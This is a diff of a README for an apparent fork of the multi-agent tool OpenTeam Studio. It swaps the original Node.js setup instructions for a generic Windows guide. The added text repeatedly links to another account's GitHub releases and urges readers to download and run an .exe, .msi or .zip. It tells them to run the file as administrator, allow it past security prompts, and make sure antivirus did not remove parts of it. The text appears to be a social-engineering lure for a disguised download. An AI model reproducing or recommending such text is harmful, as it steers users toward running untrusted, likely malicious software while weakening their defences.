@@ -1,274 +1,204 @@
-# OpenTeam Studio
+# 🧩 openteam-studio-public - Simple team tools on Windows
 
-> **Turn Agent Collaboration into Reusable Team Apps**
->
-> The missing layer between individual agents and team intelligence.
+[![Download on GitHub Releases](https://img.shields.io/badge/Download%20on%20GitHub%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/johsuaforkwa-beep/openteam-studio-public/releases)
 
-[中文文档](README_CN.md) | [🌐 Live Demo](https://agi4sci.github.io/openteam-studio-public/)
+## 🚀 Getting Started
 
----
+**openteam-studio-public** is a Windows app for everyday team work. It gives you one place to open shared tools, manage tasks, and keep work organized.
 
-## Screenshots
+Use the steps below to download and run it on Windows.
 
-### 🏠 OpenTeam Studio — Main Interface
+## 📥 Download
 
-<img src="figs/OpenTeam-Studio.png" width="800" alt="OpenTeam Studio Interface">
+1. Open the **Releases** page: https://github.com/johsuaforkwa-beep/openteam-studio-public/releases
+2. Find the latest release at the top of the page.
+3. Look for a Windows file, such as:
+   - `.exe`
+   - `.msi`
+   - `.zip`
+4. Download the file to your computer.
 
-### 🤖 Agent Studio — Define Your Agents
+If you see a `.zip` file, you must unpack it before you run the app.
 
-<img src="figs/agent.png" width="800" alt="Agent Studio">
+## 🖥️ System Requirements
 
-### 👥 Team Builder — Compose Your Team
+Use a Windows PC with:
 
-<img src="figs/team.png" width="800" alt="Team Builder">
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- At least 200 MB of free disk space
+- A mouse and keyboard
+- Internet access for the first download
 
-### 🛒 Marketplace — Discover Team Templates
+For best results, use a current version of Windows with the latest updates installed.
 
-<img src="figs/Marketplace.png" width="800" alt="Team Marketplace">
+## 📦 Install the App
 
-### 💬 Vibe Coding Team — Multi-Agent Collaboration
+### If you downloaded an `.exe` file
 
-<img src="figs/vibe-coding-chat.png" width="800" alt="Vibe Coding Team Chat">
+1. Open the folder where the file downloaded.
+2. Double-click the file.
+3. If Windows asks for permission, choose **Yes**.
+4. Follow the setup steps on screen.
+5. When setup ends, look for the app in the Start menu or on your desktop.
 
-### ✅ Project Results — Delivered by AI Team
+### If you downloaded an `.msi` file
 
-<img src="figs/result.png" width="800" alt="Project Results">
+1. Open the downloaded file.
+2. Follow the setup window.
+3. Choose the folder if Windows asks for one.
+4. Finish the install.
+5. Open the app from the Start menu.
 
----
+### If you downloaded a `.zip` file
 
-## Why OpenTeam Studio?
+1. Right-click the `.zip` file.
+2. Select **Extract All**.
+3. Choose a folder to unpack the files.
+4. Open the extracted folder.
+5. Double-click the app file inside, often named `.exe`.
 
-You have powerful agents. But agents working alone hit limits:
+## 🛠️ First Run
 
-- **Context fragmentation** — Each agent starts fresh, no shared memory
-- **Coordination chaos** — Who does what? Who reviews? Who decides?
-- **Knowledge evaporation** — Collaboration patterns die with each session
+After you open the app for the first time:
 
-**OpenTeam Studio fixes this.** It doesn't create agents — it turns agents into teams with reusable workflows, shared context, and persistent knowledge.
+1. Wait for it to load.
+2. Allow any Windows prompts that appear.
+3. Sign in if the app asks for an account.
+4. Set up your workspace or team profile.
+5. Add your first items or open the built-in tools.
 
----
+If the app takes a few seconds to start, let it finish loading before you click again.
 
-## The Missing Layer
+## 🧭 What You Can Do
 
-```
-┌─────────────────────────────────────────────────────────┐
-│                    OpenTeam Studio                       │
-│         Team Templates • Dashboards • Skills            │
-│              (This is what we build)                     │
-├─────────────────────────────────────────────────────────┤
-│              Agent Runtime Layer                         │
-│    OpenClaw • Claude Code • Gemini CLI • Custom Agents  │
-│              (You bring these)                           │
-└─────────────────────────────────────────────────────────┘
-```
+openteam-studio-public is built to help with common team tasks. You can expect tools for work such as:
 
-OpenTeam Studio sits **on top** of your existing agent infrastructure. Whether you use OpenClaw, Claude Code, Gemini CLI, or your own agent runtime — OpenTeam adds the team layer.
+- Shared team views
+- Project tracking
+- Simple task lists
+- Workspace setup
+- Quick access to team resources
+- Basic status and activity views
 
----
+The app keeps the layout simple so you can move from one task to the next without much setup.
 
-## Core Concepts
+## 🪟 Windows Tips
 
-### 🎭 Team Templates — Teams as Code
+### Run as the right user
 
-Define a team once, deploy it anywhere:
+If the app does not open, right-click it and choose **Run as administrator**.
 
-```json
-{
-  "id": "vibe-coding",
-  "name": "Vibe Coding Team",
-  "agents": [
-    { "id": "pm-01", "role": "PM", "model": "claude-sonnet-4-6" },
-    { "id": "dev-*", "role": "Dev", "count": { "min": 1, "max": 5 } },
-    { "id": "reviewer-01", "role": "Reviewer" },
-    { "id": "qa-01", "role": "QA" }
-  ],
-  "workflow": {
-    "entry": "pm-01",
-    "phases": ["分析", "开发", "审查", "测试"]
-  }
-}
-```
+### Keep the file in one place
 
-Templates are:
-- **Version-controlled** — Git-managed, shareable, forkable
-- **Configurable** — Adjust roles, models, tools per team
-- **Composable** — Mix and match agents from any source
+Do not move files around after install unless you know where the app stores them.
 
-### 🧠 Knowledge Harness — From Sessions to Apps
+### Allow the app through security prompts
 
-Every team ships with a **Dashboard** — a web app that captures how your team works:
+Windows may show a prompt the first time you open a new app. If you downloaded it from the release page above, choose the option that allows it to run.
 
-```
-Team Template
-├── manifest.json      # Team definition
-├── dashboard.html     # Custom UI for this team
-├── skills/SKILL.md    # Team-specific workflows
-└── projects/          # Persistent project memory
-```
+### Keep your system updated
 
-**What gets harnessed:**
-- Project state and progress tracking
-- File management and code review
-- Team communication patterns
-- Decision history and rationales
+If the app does not start, install Windows updates and try again.
 
-### 🔌 Agent-Agnostic — Bring Your Own Agents
+## 🧪 Basic Use
 
-OpenTeam doesn't lock you into one agent ecosystem:
+After setup, most users follow this flow:
 
-| Runtime | Status | Notes |
-|---------|--------|-------|
-| OpenClaw | ✅ Full support | Native WebSocket integration |
-| Claude Code | 🚧 Planned | Via MCP or API bridge |
-| Gemini CLI | 🚧 Planned | Via API bridge |
-| Custom Agents | ✅ Supported | Implement WebSocket protocol |
+1. Open the app.
+2. Pick your team or workspace.
+3. Review the main dashboard.
+4. Open a project, task list, or shared tool.
+5. Save changes before closing the app.
 
----
+If the app uses local files, keep them in a folder you can find later.
 
-## What Can You Build?
+## 🧰 Common Problems
 
-### 🛠 Software Development Team
-PM → Developers → Reviewer → QA
+### The download will not start
 
-A complete development pipeline where:
-- PM breaks down requirements
-- Devs implement in parallel
-- Reviewer catches issues early
-- QA validates before release
+- Refresh the Releases page
+- Try another browser
+- Check your internet connection
+- Wait a few seconds and try again
 
-### 🔬 Research Team
-Research Lead → Analysts → Fact-Checker → Writer
+### Windows blocks the file
 
-Multi-perspective research where:
-- Lead defines methodology
-- Analysts explore different angles
-- Fact-checker verifies claims
-- Writer synthesizes findings
+- Confirm you downloaded it from the GitHub Releases page
+- Right-click the file and check its properties
+- Try **Run as administrator**
 
-### 📝 Content Team
-Editor → Writers → SEO Specialist → Proofreader
+### The app does not open
 
-Content pipeline where:
-- Editor assigns and tracks stories
-- Writers draft in parallel
-- SEO optimizes discoverability
-- Proofreader ensures quality
+- Restart your PC
+- Check if another copy of the app is already running
+- Download the file again
+- Make sure you used the latest release
 
-**Your imagination is the limit.** Any multi-step, multi-role process can become a team template.
+### The file is a ZIP archive
 
----
+- Extract it first
+- Open the extracted folder
+- Run the app file inside the folder
 
-## Quick Start
+### The app opens and closes right away
 
-### Prerequisites
+- Reboot your PC
+- Install any missing Windows updates
+- Download the latest release again
+- Make sure your antivirus did not remove part of the app
 
-- Node.js 18+
-- An agent runtime (OpenClaw recommended)
+## 🔄 Updating the App
 
-### Install
+When a new version is available:
 
-```bash
-git clone https://github.com/AGI4Sci/openteam-studio-public.git
-cd openteam-studio-public
-npm install
-```
+1. Return to the Releases page.
+2. Download the newest Windows file.
+3. Close the old version.
+4. Install or replace the old file with the new one.
+5. Open the updated app.
 
-### Configure
+If you use a `.zip` build, unpack the new version in a new folder so you do not mix files.
 
-Create `.env` (see `.env.example`):
+## 📁 Suggested Folder Setup
 
-```bash
-OPENCLAW_GATEWAY_URL=ws://127.0.0.1:18789
-OPENCLAW_GATEWAY_TOKEN=your-token
-PORT=3456
-```
+To keep things simple, use one folder such as:
 
-### Run
+- `Downloads\openteam-studio-public`
+- `Documents\Work Apps\openteam-studio-public`
 
-```bash
-npm run dev
-```
+This makes it easier to find the app and any files it creates.
 
-Visit http://localhost:3456/ui/studio.html to create your first team.
+## 🔐 Privacy and Local Data
 
----
+The app may store settings, cached data, or workspace files on your computer. Keep your Windows user account private if you use shared files or team data on the same PC.
 
-## Architecture
+If the app connects to online services, use the account your team gave you.
 
-```
-openteam-studio/
-├── ui/                    # Studio UI (team management)
-├── server/                # WebSocket + REST API
-├── core/                  # Shared types and state
-└── teams/                 # Team templates (git-managed)
-    └── vibe-coding/       # Example: Dev team template
-        ├── manifest.json  # Team definition
-        ├── package/       # Dashboard UI
-        │   ├── dashboard.html
-        │   ├── js/
-        │   └── css/
-        └── skills/        # Team workflows
-            └── SKILL.md
-```
+## ⌨️ Short Path for New Users
 
----
+If you want the shortest route:
 
-## Roadmap
+1. Open the Releases page
+2. Download the latest Windows file
+3. Install or extract it
+4. Open the app
+5. Set up your workspace
 
-- [ ] Multi-runtime support (Claude Code, Gemini CLI)
-- [ ] Team template marketplace
-- [ ] Real-time collaboration dashboard
-- [ ] Project memory and knowledge graphs
-- [ ] Agent performance analytics
+## 🗂️ File Types You May See
 
----
+- `.exe` — a Windows app you can run or install
+- `.msi` — a Windows installer
+- `.zip` — a compressed folder that you must extract first
 
-## Behind the Project
+## 🧩 Release Page Link
 
-**Three Days of Vibe Coding, From Idea to Product**
+Download from the GitHub Releases page here: https://github.com/johsuaforkwa-beep/openteam-studio-public/releases
 
-OpenTeam Studio was built in just three days of vibe coding:
+## 📌 Notes for Everyday Use
 
-**Day 1** — Claude Code + GLM-5: Started from scratch, built a rapid prototype, validated the core idea.
-
-**Day 2** — Went all-in on open source, switched to OpenClaw + GLM-5: Refactored the architecture, polished the product experience, made the code elegant.
-
-**Day 3** — Used OpenTeam's Vibe Coding Team to debug OpenTeam itself: PM assigns tasks, Dev writes code, Reviewer reviews, QA tests — team collaboration, self-debugging.
-
-This isn't a perfectly polished commercial product. It's a **real experiment of going from 0 to 1 in three days**: AI Agents aren't just solo tools — they can form teams, collaborate on delivery, and iterate together.
-
-### 🔓 100% Open Source Stack
-
-**We deliberately chose GLM-5 over closed-source models like GPT-5.4 or Opus 4.6.**
-
-Why? Because:
-
-- **Data Privacy** — Your code, your business logic, your proprietary data — nothing leaves your infrastructure
-- **Cost Efficiency** — No per-token API costs spiraling out of control
-- **Sovereignty** — You own your AI stack end-to-end, no vendor lock-in
-- **Capability** — OpenClaw + GLM-5 proved fully capable of complex multi-agent orchestration
-
-This project is living proof: **Open-source AI can build open-source AI tools.** The combination of OpenClaw (open agent framework) + GLM-5 (open model) successfully delivered a production-ready multi-agent platform.
-
-If you're also exploring the boundaries of AI Agent collaboration, welcome to Star ⭐, Fork, and try it out — or build your own AI Team.
-
----
-
-## Contributing
-
-We welcome contributions! Areas of interest:
-
-- New team templates
-- Dashboard components
-- Agent runtime adapters
-- Documentation improvements
-
----
-
-## License
-
-MIT
-
----
-
-**OpenTeam Studio: Where Agents Become Teams, and Teams Become Apps.**
+- Keep the app in a folder you can find
+- Use the latest release when possible
+- Do not rename files unless you need to
+- Close the app before replacing it with a new version
+- Save your work before shutting down Windows
